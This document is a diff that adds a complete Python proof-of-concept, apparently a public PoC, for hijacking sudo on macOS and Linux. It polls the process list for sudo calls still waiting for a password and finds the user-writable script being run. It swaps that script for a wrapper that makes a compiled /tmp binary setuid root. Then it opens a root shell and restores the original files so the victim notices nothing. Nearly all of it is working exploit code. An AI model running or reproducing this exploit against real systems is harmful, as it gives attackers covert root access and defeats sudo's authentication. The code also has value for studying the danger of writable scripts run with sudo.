@@ -1,0 +1,212 @@
+#!/usr/bin/env python2.7
+#
+# sudo hijack PoC by m4rkw
+#
+# test on macos and linux
+#
+# run this in one terminal window, then open another and execute something with
+# sudo that you have write access to.
+#
+# in the time it takes you to enter your sudo password, sudo_steal.py will hijack
+# the target in order to steal a root shell, and then pass the execution chain
+# on to a copy of the script so the user running sudo won't know anything is amis.
+
+import os
+import sys
+import time
+
+
+# we can only hijack sudo if the target command/script is writable
+
+def is_writable(path):
+  try:
+    with open(path,'a+') as f:
+      pass
+    return True
+  except:
+    pass
+
+  return False
+
+
+# most user-owned stuff executed with sudo will be at a relative path so we
+# need to recursively search for it as quickly as possible.
+#
+# we only have the time it takes the user to enter their password to find
+# the target and hijack it, so this needs to be as fast as possible. this
+# should be quick enough on most mac or linux systems, but if you have a
+# bunch of directories with lots of files it may be too slow.
+
+def fast_find_file(filename):
+  matches = []
+
+  h = os.environ['HOME']
+
+  home_path = "%s/%s" % (h, filename)
+
+  if os.path.exists(home_path) and is_writable(home_path):
+    matches.append(home_path)
+
+  dirs = []
+
+  for x in os.popen("ls -a1 %s" % (h)).read().rstrip().split("\n"):
+    if os.path.isdir("%s/%s" % (h, x)) and not os.path.islink("%s/%s" % (h, x)):
+      if x not in [
+          '.', '..',
+          'Library',
+          'Music',
+          'Pictures',
+          'Documents',
+          'Movies',
+          'VirtualBox VMs',
+          '.cups',
+          '.vagrant.d',
+          '.ansible'
+        ]:
+        dirs.append("%s/%s" % (h, x))
+
+  cmd = "find %s -type f -name %s 2>/dev/null" % (" ".join(dirs), filename)
+
+  for x in os.popen(cmd).read().rstrip().split("\n"):
+    if os.path.exists(x) and is_writable(x):
+      matches.append(x)
+
+  if len(matches) == 0:
+    return False
+
+  return matches
+
+
+# generate a temporary filename to move the hijacked script to
+
+def get_target(match):
+  target = match + 'x'
+
+  while os.path.exists(target):
+    target += 'x'
+
+  return target
+
+
+# check if the process is still alive
+
+def alive(pid):
+  return os.system("ps %s 1>/dev/null" % (pid)) == 0
+
+
+# we have a list of paths that may be the target, so hijack and redirect
+# them all
+
+def exploit(pid, matches):
+  remap = {}
+  remapped = []
+
+  for match in matches:
+    remap[match] = get_target(match)
+
+    print "hijacking %s..." % (match)
+
+    try:
+      # move the target out of the way and drop in a bash redirect script
+      # that sets 0:0 and +s on our rootshell payload
+      os.rename(match, remap[match])
+      with open(match,'w') as f:
+        f.write("#!/bin/bash\n")
+        f.write("chown 0:0 /tmp/.,\n")
+        f.write("chmod 4755 /tmp/.,\n")
+        f.write("%s $@\n" % (remap[match]))
+      os.chmod(match, 0755)
+      remapped.append(match)
+    except:
+      pass
+
+  if len(remapped) == 0:
+    print "hijack failed."
+    return
+
+  success = False
+  while True:
+    if os.stat("/tmp/.,").st_uid == 0:
+      success = True
+      break
+
+    if not alive(pid):
+      break
+
+    time.sleep(1)
+
+  # move the hijacked files back into place
+  for match in remapped:
+    os.rename(remap[match], match)
+
+  if success:
+    os.system("/tmp/.,")
+    sys.exit(0)
+
+  print "exploit failed."
+
+
+# simple rootshell payload
+
+with open("/tmp/.,.c","w") as f:
+  f.write("#include <unistd.h>\n")
+  f.write("int main(){setuid(0);seteuid(0);execl(\"/bin/bash\",")
+  f.write("\"bash\",\"-c\",\"rm -f /tmp/.,; /bin/bash\",NULL);")
+  f.write("return 0;}\n")
+
+os.system("gcc -o /tmp/., /tmp/.,.c; rm -f /tmp/.,.c")
+
+
+# continuously scan for hijackable processes
+
+while True:
+  ps_lines = os.popen("ps -a -o pid= -o ppid= -o command= |xargs -L1").read().rstrip().split("\n")
+
+  children = {}
+
+  # build a map of children so we can avoid trying to hijack sudo
+  # processes that have children (i.e. already authenticated)
+
+  for line in ps_lines:
+    seg = line.split(' ')
+    pid = seg[0]
+    ppid = seg[1]
+
+    if not ppid in children.keys():
+      children[ppid] = []
+
+    children[ppid].append(pid)
+
+  # look for invocations of sudo that have prompted the user for their password
+  # and where the target binary/script is user-writable
+
+  for line in ps_lines:
+    seg = line.split(' ')
+
+    if seg[2] == 'sudo':
+      print "potential target: %s" % (line)
+
+      pid = seg[0]
+
+      # if sudo has child processes then it's already authenticated
+      if pid in children.keys():
+        print "%s has children, skipping" % (pid)
+        continue
+
+      args = seg[3:]
+
+      while True:
+        matches = fast_find_file(" ".join(args))
+
+        if matches:
+          break
+
+        args = args[0:len(args)-1]
+
+        if len(args) == 0:
+          break
+
+      if matches:
+        exploit(pid, matches)
+
+  time.sleep(1)
